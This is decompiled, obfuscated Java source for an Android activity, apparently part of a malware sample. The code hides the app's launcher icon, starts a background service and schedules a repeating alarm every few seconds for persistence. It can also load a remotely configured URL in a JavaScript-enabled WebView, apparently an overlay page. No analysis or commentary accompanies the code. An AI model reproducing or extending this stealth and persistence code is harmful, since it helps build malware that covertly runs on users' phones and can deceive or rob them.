package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.webkit.WebView;
import wocwvy.czyxoxmbauu.slsa.C0033a;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.C0039c;
import wocwvy.czyxoxmbauu.slsa.jtfxlnc;

public class myvbo extends Activity {

    /* renamed from: a */
    C0034b f456a = new C0034b();

    /* renamed from: b */
    C0039c f457b = new C0039c();

    /* renamed from: c */
    C0034b f458c = new C0034b();

    /* renamed from: d */
    C0033a f459d = new C0033a();

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (!this.f457b.f388o || VERSION.SDK_INT < 19) {
            startService(new Intent(this, jtfxlnc.class));
        } else {
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl(this.f457b.f389p);
            setContentView(webView);
        }
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, myvbo.class), 2, 1);
        try {
            C0034b bVar = this.f456a;
            C0034b.m231a((Context) this, "startAlarm", (long) Integer.parseInt(this.f456a.mo234e(this, "Interval")));
        } catch (Exception unused) {
            C0034b bVar2 = this.f456a;
            C0034b.m231a((Context) this, "startAlarm", 10000);
        }
        if (!this.f457b.f388o) {
            finish();
        }
    }
}
